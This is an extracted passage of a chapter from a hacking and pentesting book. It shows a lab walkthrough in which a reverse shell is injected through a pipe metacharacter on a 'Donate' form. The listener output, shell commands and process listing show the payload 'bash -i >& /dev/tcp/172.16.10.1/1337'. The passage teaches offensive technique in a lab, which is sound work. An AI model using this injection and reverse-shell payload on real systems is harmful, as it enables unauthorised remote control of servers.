@@ -1,0 +1,56 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 6 - Note that Figure 7-2 includes the full reverse shell payload, as well as the pipe metacharacter | used to exploit the vulnerability.
+Security Relevance Score: 3
+Word Count: 434
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Note that Figure 7-2 includes the full reverse shell payload, as well as the pipe metacharacter | used to exploit the vulnerability.
+
+Figure 7-2: The successful injection of a reverse shell payload into p-web-02
+
+Clicking the Donate button should instantly trigger the reverse shell connection. In the Kali terminal window running the shell listener, you should see the following output:
+--snip--
+listening on [any] 1337 ...
+172.16.10.12: inverse host lookup failed: Unknown host
+connect to [172.16.10.1] from (UNKNOWN) [172.16.10.12] 54530
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@p-web-02:/var/www/html$
+
+Success! We’ve popped yet another shell and compromised the p-web-02 server. In the prompt on the final line, we can see confirmation that we’ve gained an active shell on the p-web-02 host by using the www-data user and that the present working directory is /var/www/html.
+
+
+Executing Commands
+We can now use the Kali shell listener terminal just as we would any other shell. Let’s remotely execute a bash command on p-web-02 through the reverse shell:
+--snip--
+bash: no job control in this shell
+www-data@p-web-02:/var/www/html$ uname -a
+
+Linux p-web-02.acme-impact-alliance.com 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC
+Debian 6.1.12-1kali1 x86_64 GNU/LinuxTypes of Reverse Shells
+
+In this example, we remotely execute the uname -a command on the server and automatically return its output stream back to the Kali listener.
+We can even do some introspection on the connection by entering the process snapshot command ps aux and reviewing the currently running reverse shell process (Listing 7-2).
+--snip--
+www-data@p-web-02:/var/www/html$ ps aux
+
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT  TIME COMMAND
+root           1  0.0  0.4 233332 38868 ?        Ss    0:03 apache2 -DFOREGROUND
+www-data      19  0.0  0.2 234012 21652 ?        S     0:00 apache2 -DFOREGROUND
+www-data      20  0.0  0.2 234012 21384 ?        S     0:00 apache2 -DFOREGROUND
+www-data      21  0.0  0.5 234644 47224 ?        S     0:00 apache2 -DFOREGROUND
+www-data      22  0.0  0.2 234020 21776 ?        S     0:00 apache2 -DFOREGROUND
+www-data      23  0.0  0.2 234020 21528 ?        S     0:00 apache2 -DFOREGROUND
+www-data      24  0.0  0.2 234012 21448 ?        S     0:00 apache2 -DFOREGROUND
+www-data     131  0.0  0.0   2480   520 ?        S   ❶ 0:00 sh -c echo | bash -c
+'bash -i >& /dev/tcp/172.16.10.1/1337 0>&' >> amount_to_donate.txt
+www-data     133  0.0  0.0   3896  2948 ?        S   ❷ 0:00 bash -c bash -i >&
+/dev/tcp/172.16.10.1/1337 0>&1
+www-data     134  0.0  0.0   4160  3516 ?        S   ❸ 0:00 bash -i
+www-data     169  0.0  0.0   6756  2944 ?        R     0:00 ps aux
+
+Listing 7-2: Viewing process information
+In the process output, we can clearly see how the reverse shell payload gets executed on the remote server, starting with the process whose ID is
